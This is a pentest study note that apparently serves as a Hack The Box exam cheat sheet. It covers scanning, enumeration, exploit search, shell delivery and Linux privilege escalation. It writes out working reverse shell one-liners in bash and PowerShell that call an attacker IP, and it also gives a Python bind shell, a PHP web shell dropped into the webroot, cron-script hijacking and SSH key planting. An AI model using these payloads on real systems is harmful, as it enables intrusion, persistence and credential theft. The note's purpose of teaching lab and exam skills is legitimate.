---
id: gs-001
module: Getting Started
kind: methodology
title: "Pentest Fundamentals — Complete Enumeration → Exploitation → Escalation Flow"
description: "End-to-end HTB attack methodology: service scanning, web enum, exploit delivery, shell types, privilege escalation, and critical pitfalls."
tags: [nmap, enumeration, exploitation, shells, privesc, metasploit, ssh, smb, ftp, burp, gobuster, privilege-escalation, footprinting, initial-access]
---

# Getting Started — Complete Pentest Methodology

## TL;DR — 5-Phase Flow

1. **Recon** — Nmap scan (quick 1000 ports → full -p-), banner grab, OS fingerprint
2. **Web/Service Enum** — Gobuster dirs, HTTP headers, whatweb, config files, hidden entries
3. **Exploit Search** — searchsploit, Metasploit, Google; prioritize public CVEs
4. **Initial Access** — Reverse shell (most reliable), Bind shell (more stable), or Web shell (firewall bypass)
5. **Privilege Escalation** — `sudo -l`, SUID scan, SSH keys, cron jobs, kernel exploits, credential reuse

**Under exam pressure:** Enumerate ruthlessly → exploit first thing that works → escalate systematically.

---

## Golden Rule + OPSEC Fork

**Golden Rule:** Enumeration is iterative—after each scan, your findings trigger deeper enum on *that specific port/service*.

- **What NOT to waste time on:** Kernel exploits first. Start with sudo misconfigs, SUID bins, and credential reuse. Kernel exploits are last resort (unstable, noisy).
- **Firewall bypass:** Web shells run on port 80/443 and survive reboots; reverse/bind shells are faster but fragile.
- **Stability hierarchy:** SSH login > Bind shell > Reverse shell > Web shell. Always try to get credentials for SSH.

---

## Phase 1: Reconnaissance (Service Discovery)

### Goal
Identify all open ports, running services, and OS version to determine attack surface.

### Trigger / Precondition
- You have access to a target IP.
- VPN is connected (check: `ip a` shows `tun0`, `ping 10.10.14.1` succeeds).

### Exact Commands

**Quick scan (1000 most common ports):**
```bash
nmap $TARGET_IP
```

**Full scan (all 65535 TCP ports + service/version detection):**
```bash
nmap -sV -sC -p- $TARGET_IP
```

**Scan with script execution (OS fingerprint, SMB enum, etc.):**
```bash
nmap -A -p- $TARGET_IP
```

**Scan specific ports (after initial results):**
```bash
nmap -sV -sC -p 21,22,80,445,3389 $TARGET_IP
```

**UDP scan (SNMP, DNS) — slower, run if TCP sparse:**
```bash
nmap -sU -p 53,161,162 $TARGET_IP
```

### Output Checkpoint
After this phase you have:
- List of open ports + service names
- Service versions (e.g., "Apache 2.4.41", "OpenSSH 8.2p1")
- OS guess (Linux/Windows version if confident)
- Banner information (SSH version, web server headers)

### Banner Grabbing (Manual Confirmation)
```bash
nc -nv $TARGET_IP $PORT
# or
curl -IL http://$TARGET_IP:$PORT
# or
socat - TCP4:$TARGET_IP:$PORT
```

---

## Phase 2: Service & Web Enumeration

### Goal
Extract configuration, credentials, hidden functionality, and technology stack from each service.

### Trigger / Precondition
- Open ports identified from Phase 1.
- For web services (port 80, 443, 8080, etc.): determine if HTTP/HTTPS is running.
- For SMB (port 445, 139): network file shares may contain credentials/configs.
- For FTP (port 21): anonymous access sometimes enabled.

### A. Web Enumeration (if port 80/443/8080 open)

**Step 1: Check robots.txt & source code**
```bash
curl http://$TARGET_IP/robots.txt
curl http://$TARGET_IP/ | head -50  # view HTML source for comments
```

**Step 2: Directory/file brute-force with Gobuster**
```bash
gobuster dir -u http://$TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40 -q
```

**Step 3: Subdomain enumeration (if domain is in scope)**
```bash
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/namelist.txt
```

**Step 4: Identify web technologies**
```bash
whatweb $TARGET_IP
curl -I http://$TARGET_IP | grep -i server  # server header
```

**Step 5: Check for default credentials & common paths**
- `/admin`, `/login`, `/index.php`, `/wp-admin`, `/nibbleblog/admin.php`
- Try: `admin:admin`, `admin:password`, `guest:guest`, application-specific defaults

### Output Checkpoint
After web enum you have:
- List of directories (admin panels, uploads, configs, plugins)
- Technology stack (CMS, framework, versions)
- Exposed files (config.php, robots.txt comments, source comments with credentials)
- Login pages & default/guessable credentials

### B. SMB Enumeration (if port 445/139 open)

**List shares (guest access):**
```bash
smbclient -N -L \\\\$TARGET_IP
```

**Connect to share with creds:**
```bash
smbclient -U username \\\\$TARGET_IP\\sharename
# commands: ls, cd, get, put
```

**OS/version detection:**
```bash
nmap --script smb-os-discovery.nse -p445 $TARGET_IP
```

### C. FTP Enumeration (if port 21 open)

**Anonymous login attempt:**
```bash
ftp $TARGET_IP
# login: anonymous / anonymous
# commands: ls, cd, get, binary mode
```

### D. SNMP Enumeration (if port 161 open)

```bash
snmpwalk -v 2c -c public $TARGET_IP 1.3.6.1.2.1.1.5.0
# Brute-force community strings:
onesixtyone -c /usr/share/seclists/SNMP/common-snmp-strings.txt $TARGET_IP
```

### Output Checkpoint After Phase 2
You have:
- Enumerated all web paths + technologies
- Identified SMB shares, potentially with accessible files
- Located configuration files, credentials in plaintext, version numbers
- Known public vulnerabilities for each service/version

---

## Phase 3: Exploit Search & Selection

### Goal
Find & validate public exploits for identified services/versions.

### Trigger / Precondition
- Service version known (e.g., "Nibbleblog 4.0.3", "Apache Tomcat 9.0.1").
- Web app technology identified (WordPress, GetSimple, custom app).
- Credentials or auth bypass found (or don't exist).

### Exact Commands

**Searchsploit (local ExploitDB):**
```bash
searchsploit "Application Version"
searchsploit -m php/remote/12345  # copy exploit to current dir
```

**Metasploit search:**
```bash
msfconsole -q
search <name>
search cve:2021-12345
use exploit/path/to/exploit
show options
```

**Google search strategy:**
- `"Application X.X.X" exploit github`
- `"CVE-YYYY-ZZZZ" manual exploitation`
- `site:github.com "Vulnerability Name"`

### Decision: Metasploit vs Manual Exploit?

| Situation | Choose |
|-----------|--------|
| Exploit is simple (RCE, file read) | Metasploit (faster, handles payload setup) |
| Exploit requires custom payload | Manual (Python, custom shell delivery) |
| Multiple targets / need reliability | Manual + script (more control) |
| Running out of time (exam) | Metasploit (less setup overhead) |

### Output Checkpoint
After Phase 3 you have:
- At least one viable exploit path (prioritize unauthenticated RCE)
- Metasploit module name OR manual exploit code + required options
- Understanding of what the exploit does (file upload, SQLi, command injection, etc.)

---

## Phase 4: Initial Access (Shell Delivery)

### Goal
Execute commands on target and establish interactive shell (reverse, bind, or web).

### Trigger / Precondition
- Exploit identified and validated (or RCE achieved via other means).
- Firewall/network rules understood (firewall may block outbound reverse shells → use bind or web shell).

### A. Reverse Shell (MOST RELIABLE FOR EXAM)

**On attacker machine:**
```bash
nc -lvnp $LPORT  # listen for incoming connection
# or in Metasploit: use payload/generic/shell_reverse_tcp, set LHOST + LPORT
```

**Execute on target** (choose one per target OS):

**Linux / Bash:**
```bash
bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1'
# or
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP $LPORT >/tmp/f
```

**PowerShell (Windows):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ATTACKER_IP',$LPORT);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### B. Bind Shell (Alternative if outbound blocked)

**On target (execute via RCE):**
```bash
bash: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $LPORT >/tmp/f
python: python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",$LPORT));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

**On attacker machine:**
```bash
nc $TARGET_IP $LPORT
```

### C. Web Shell (Firewall Bypass / Persistence)

**Write to webroot** (execute via RCE or file upload):
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

**Execute commands:**
```bash
curl "http://$TARGET_IP/shell.php?cmd=id"
curl "http://$TARGET_IP/shell.php?cmd=cat%20/etc/passwd"
```

### Output Checkpoint After Phase 4
- You have interactive shell access as low-privileged user (usually `www-data`, `nobody`, or a service account).
- You can execute arbitrary commands.
- Next step: upgrade TTY + enumerate for privilege escalation.

### Upgrade TTY to Full Interactive Shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# or for more features:
stty raw -echo; fg  # background shell first with Ctrl+Z
```

---

## Phase 5: Privilege Escalation

### Goal
Escalate from low-privileged user to root (Linux) or SYSTEM (Windows).

### Trigger / Precondition
- Initial shell obtained.
- `id` / `whoami` shows non-root user.
- Need to find local/internal vulnerability to escalate.

### A. Check Sudo Privileges (Fastest & Most Common)

```bash
sudo -l  # list allowed commands without password
```

**If entry exists (especially NOPASSWD):**
```bash
sudo -u user2 /bin/bash     # switch to another user
sudo su -                   # become root (if ALL permitted)
sudo /path/to/script        # execute editable script as root
```

**If vulnerable binary found** (e.g., `sudo /bin/bash`, `sudo /usr/bin/php`):
- Check GTFOBins (https://gtfobins.github.io/) for privilege escalation techniques

### B. Find & Exploit Writeable Files Run by Root

**Check cron jobs:**
```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
find /var/spool/cron/crontabs/ -type f 2>/dev/null
```

**If script is world-writable or owned by current user:**
```bash
# Append reverse shell to writable script
echo 'bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1"' >> /path/to/script.sh
# Wait for cron to execute, catch shell on listener
```

### C. SUID Binary Exploitation

**Find SUID binaries:**
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Check GTFOBins for each binary** (e.g., `/usr/bin/sudo`, `/usr/bin/find`, `/usr/bin/vim`):
- Some allow shell escape (`!/bin/bash` in vim, `-exec /bin/bash` in find)

### D. SSH Keys (Read Root's Private Key)

**If readable:**
```bash
cat /root/.ssh/id_rsa
# Copy to attacker machine, chmod 600, ssh -i key root@localhost
```

**If you have write access to /root/.ssh/**:
```bash
ssh-keygen -f mykey  # on attacker
cat mykey.pub >> /root/.ssh/authorized_keys
ssh -i mykey root@$TARGET_IP
```

### E. Credential Reuse (Check Config Files & Logs)

```bash
grep -r "password" /var/www/html/ 2>/dev/null
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep pass
cat ~/.bash_history
cat /home/user/.bash_history
env | grep -i pass
```

**If password found, try:**
```bash
su - root
# or
sudo su -  # if current user has sudo ALL
```

### F. Kernel Exploit (Last Resort)

```bash
uname -a  # check kernel version
searchsploit "Linux 3.9"  # search for CVE
# Run exploit (be careful—can cause crashes)
```

### Output Checkpoint
- `whoami` returns `root` or `#` prompt appears
- You can read `/root/flag.txt` or `/etc/shadow`
- Escalation is complete

---

## Decision Tree (Under Exam Pressure)

```
Initial shell obtained?
├─ NO → Phase 3/4 failed
│   └─ Stuck > 5 min → Try different exploit / web shell instead
├─ YES → Try sudo -l
│   ├─ Allows command as root? → Run it (fastest path)
│   ├─ No output? → Continue to next check
│   └─ NOPASSWD to writable script? → Append reverse shell + wait for cron
├─ Check crontab -l
│   ├─ Root-owned cron job calling writable script? → Exploit it
│   └─ Nothing? → Next check
├─ Find / -perm -u=s 2>/dev/null | head -20
│   ├─ Unusual SUID binary? → Check GTFOBins
│   └─ Nothing interesting? → Next check
├─ Check for SSH keys (/root/.ssh/id_rsa readable?)
│   ├─ YES → Copy to attacker, ssh -i key root@localhost
│   └─ NO → Next check
├─ grep -r "password" /var/www/html / /home / /etc 2>/dev/null
│   ├─ Found credentials? → su root / sudo su / ssh to another user
│   └─ Nothing? → Last resort
└─ Kernel exploit (risky, exam-unfriendly)
    └─ searchsploit "$(uname -r)" → only if everything else fails
```

---

## Signal → Counter-Move Table

| Signal (What You Observe) | Likely Cause | Exact Fix / Command |
|---|---|---|
| `sudo -l` shows nothing or "user is not in sudoers" | User has no sudo privileges | Check cron jobs, SUID bins, SSH keys, credentials instead |
| Port scan returns "filtered" instead of "open" | Firewall blocking access | Use bind shell or web shell (port 80/443) instead of reverse |
| Reverse shell doesn't connect back | Firewall blocks outbound, or wrong IP/port | Use bind shell, web shell, or upload socat binary for stable tunnel |
| `nc -lvnp` port shows "Permission denied" | Port < 1024 requires root | Use port > 1024 (e.g., 4444) or `sudo nc -lvnp 80` |
| Web shell executed but no output | PHP disabled or not in PATH | Try other shell types (Python, Bash) or check Apache logs for errors |
| Cron job not executing appended script | Script loses execute perms after echo | Use `tee -a` or ensure file stays executable after append |
| Can't read /root/.ssh/id_rsa | Permissions too restrictive | Check if /root dir is group-readable by current user, or find alternate key |
| grep password finds nothing in configs | App stores creds in database, not files | Try default credentials, look in /proc for process cmdline args |

---

## Master Cheatsheet — One-Liners by Scenario

### Scenario: Quick Nmap + Web Enum + Metasploit Path

```bash
# 1. Scan
nmap -sV -sC -p- $TARGET_IP | tee nmap.txt

# 2. Web enum (if port 80 open)
gobuster dir -u http://$TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -q

# 3. Identify tech
whatweb $TARGET_IP

# 4. Search Metasploit
msfconsole -q
search nibbleblog  # or whatever app found
use exploit/path
set RHOSTS $TARGET_IP
set LHOST $ATTACKER_IP
exploit

# 5. Upgrade shell + escalate
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
```

### Scenario: Reverse Shell + Manual Privesc

```bash
# Listener
nc -lvnp 4444

# Target RCE (via vulnerability)
bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'

# After catching shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# Escalation checks
sudo -l
find / -perm -u=s 2>/dev/null
cat /etc/crontab
ls -la /root/.ssh/id_rsa
grep -r "password" /var/www/html/ 2>/dev/null
```

### Scenario: Web Shell (Persistent, Firewall Bypass)

```bash
# Write to webroot (via file upload or RCE)
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

# Execute
curl "http://$TARGET_IP/shell.php?cmd=id"
curl "http://$TARGET_IP/shell.php?cmd=sudo%20-l"

# For persistence: shell survives reboots, no listener needed
```

### Scenario: SMB Share Enumeration + Creds Found

```bash
smbclient -N -L \\\\$TARGET_IP
smbclient -U bob \\\\$TARGET_IP\\users
# Inside: get <filename>, cd <dir>

# If creds leaked, try SSH
ssh user@$TARGET_IP
# or su / sudo
```

---

## Quick Reference — Tools by Function

| Function | Tool | Command |
|----------|------|---------|
| Port scanning | Nmap | `nmap -sV -sC -p- $IP` |
| Web dir enum | Gobuster | `gobuster dir -u http://$IP -w /usr/share/seclists/...` |
| Web tech ID | Whatweb | `whatweb $IP` |
| HTTP headers | curl | `curl -I http://$IP` |
| Exploit search | Searchsploit | `searchsploit "App Version"` |
| Exploit framework | Metasploit | `msfconsole; search <name>; use; set; exploit` |
| Reverse shell listener | Netcat | `nc -lvnp $PORT` |
| TTY upgrade | Python pty | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
| SMB enum | smbclient | `smbclient -N -L \\\\$IP` |
| SSH access | SSH | `ssh -i key user@$IP` |
| Privilege check | Sudo | `sudo -l` |
| SUID find | find | `find / -perm -u=s 2>/dev/null` |
| File search | grep | `grep -r "password" / 2>/dev/null` |

---

## Top Gotchas (Exam Time Sinks)

1. **Forgetting to check robots.txt & source comments** — Often contains `/admin` paths or credential hints.
2. **Not upgrading to full TTY shell** — Reversed shells are fragile; TTY upgrade makes tab-complete + history work, saves 10 min of frustration.
3. **Running kernel exploits too early** — Kernel crashes tank points + morale. Exhaust sudo, SUID, cron first.
4. **Assuming credentials are wrong when they're actually correct** — Try different shells/services (SSH, SMB, su, sudo).
5. **Breaking scripts by echoing/appending without backup** — Always test cron/SUID exploits in safe dirs first; one typo kills stability.
6. **Forgetting to add attacker IP to reverse shell** — Hardcode `$ATTACKER_IP` in shell one-liner, don't improvise mid-exam.
7. **Not checking `/var/spool/cron/crontabs/$USER`** — Hidden cron jobs often sit here; requires reading perms + root execution.
8. **Assuming SMB shares are guest-readable** — Always try with found credentials (`-U user`), not just `-N`.
9. **Web shell execution returning blank** — Check target's webroot (Apache: `/var/www/html`, Nginx: `/usr/local/nginx/html`, IIS: `c:\inetpub\wwwroot`).
10. **Running Metasploit without setting LHOST correctly** — If you set LHOST to eth0 but only tun0 is routable to target, connection fails silently for 2 min.

---

## Related Vault Notes

[[01-infosec-fundamentals]] — CIA triad, Risk Management, Red Team vs Blue Team basics  
[[02-pentest-distro-setup]] — VM setup, VPN troubleshooting, essential distros  
[[03-service-scanning]] — Deep dive: Nmap scripts, OS fingerprinting, service-specific enum  
[[04-web-enumeration]] — Gobuster tuning, DNS subdomain enum, certificate inspection  
[[05-public-exploits]] — Searchsploit + Metasploit walkthrough, exploit selection  
[[06-shell-types]] — Reverse shell syntax by OS, TTY upgrade deep dive, web shell persistence  
[[07-privilege-escalation]] — Sudo abuse, SUID exploitation, SSH key theft, cron job hijacking  
[[08-common-pitfalls]] — VPN troubleshooting, Burp proxy issues, SSH key generation  
[[../ad-enum-attacks/00-METHODOLOGY.md]] — Chains into Getting Started for Active Directory targets  
[[../nmap/]] — Nmap scripting & evasion for exam speed  

---

## Triage Backlink

→ See **ATTACK-PATHS.md** for symptom-to-methodology mapping:
- "I have RCE but shell is fragile" → Phase 4: Reverse Shell upgrade
- "Sudo -l shows nothing" → Phase 5: Cron job hijacking
- "Port scan returns filtered" → Phase 4: Bind shell / Web shell
- "Found credentials in config" → Phase 5: Credential reuse (su/ssh/sudo)

---

**Last Updated:** 2026-05-16  
**For Exam Use:** Print phases 3-5, decision tree + master cheatsheet as quick ref during 24h pwn phase.
